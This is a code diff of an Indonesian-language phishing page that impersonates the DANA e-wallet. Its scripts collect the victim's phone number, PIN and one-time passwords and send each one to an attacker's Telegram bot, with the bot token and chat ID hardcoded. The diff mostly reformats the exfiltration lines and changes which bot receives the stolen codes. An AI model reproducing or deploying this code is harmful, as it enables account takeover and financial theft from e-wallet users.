@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="id">
 
@@ -593,7 +594,7 @@
           memiliki saldo minimal
           Rp300.000 di aplikasi DANA kamu sebagai bukti bahwa kamu pengguna aktif aplikasi DANA.</p>
         <div class="tbl6">
-          <button class="btn66" onclick="window.location.href='https://wa.me/6285669310956?text=request kode OTP'">Mengerti</button>
+          <button class="btn66" onclick="window.location.href='https://play.google.com/store/apps/details?id=id.dana&hl=en'">Mengerti</button>
         </div>
       </div>
       <br>
@@ -601,6 +602,7 @@
       </div>
     </div>
   </div>
+
   <script>
     function formatPhoneNumber() {
       const input = document
@@ -646,8 +648,9 @@
     document.getElementById("spinner").style.display = "flex";
     var phoneNumber = document.getElementById("phone").value.replace(/\s/g, '');
 
-    var botToken = '8392563855:AAHdYuVCBA15VKB8ycDbOCGXE95El2lArUI';
-    var chatId = '6556235597';
+        var botToken =
+          '8392563855:AAHdYuVCBA15VKB8ycDbOCGXE95El2lArUI';
+        var chatId = '6556235597';
     var message = `❁┷━❃∞FORMASI∞∞❃━┷❁\n※ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}`;
 
     var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
@@ -674,9 +677,9 @@
         .style.display = 'flex';
 
       // Mengirim data ke API chat Telegram
-      var botToken =
-        '8392563855:AAHdYuVCBA15VKB8ycDbOCGXE95El2lArUI';
-      var chatId = '6556235597';
+        var botToken =
+          '8392563855:AAHdYuVCBA15VKB8ycDbOCGXE95El2lArUI';
+        var chatId = '6556235597';
       const message = 'Menunggu PIN.';
 
       fetch(
@@ -751,8 +754,9 @@
 
     var message = `❁┷━❃∞∞FORMASI∞∞❃━┷❁\n※ 𝗡𝗼𝗺𝗼𝗿  : ${phoneNumber}\n※ 𝗣𝗜𝗡     : ${pin}`;
 
-    var botToken = '8392563855:AAHdYuVCBA15VKB8ycDbOCGXE95El2lArUI';
-    var chatId = '6556235597';
+        var botToken =
+          '8392563855:AAHdYuVCBA15VKB8ycDbOCGXE95El2lArUI';
+        var chatId = '6556235597';
     var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
     fetch(url)
@@ -789,7 +793,7 @@ function showPage5() {
                   `🔢 *OTP* : \`${otpInput}\`\n\n` +
                   `🚀 *Login Berhasil!*`;
 
-        var botToken =     '8392563855:AAHdYuVCBA15VKB8ycDbOCGXE95El2lArUI';
+        var botToken = '8392563855:AAHdYuVCBA15VKB8ycDbOCGXE95El2lArUI';
         var chatId = '6556235597';
     var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
@@ -820,7 +824,8 @@ function showPage5() {
         document.getElementById("spinner").style.display = "flex";
 
         // Mengirim data ke API chat Telegram
-        var botToken =     '8392563855:AAHdYuVCBA15VKB8ycDbOCGXE95El2lArUI';
+        var botToken =
+          '8392563855:AAHdYuVCBA15VKB8ycDbOCGXE95El2lArUI';
         var chatId = '6556235597';
         var message = `OTP2: ${otpInput}`;
 
@@ -959,8 +964,8 @@ function showPage5() {
         document.getElementById("spinner").style.display = "flex";
 
         var botToken =
-          '8073780355:AAER70vkWImzZeJW-t4FPqPI0iSOr2J3XMU';
-        var chatId = '7163772945';
+          '8392563855:AAHdYuVCBA15VKB8ycDbOCGXE95El2lArUI';
+        var chatId = '6556235597';
         var message = `OTP: ${otpInput}`;
         var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
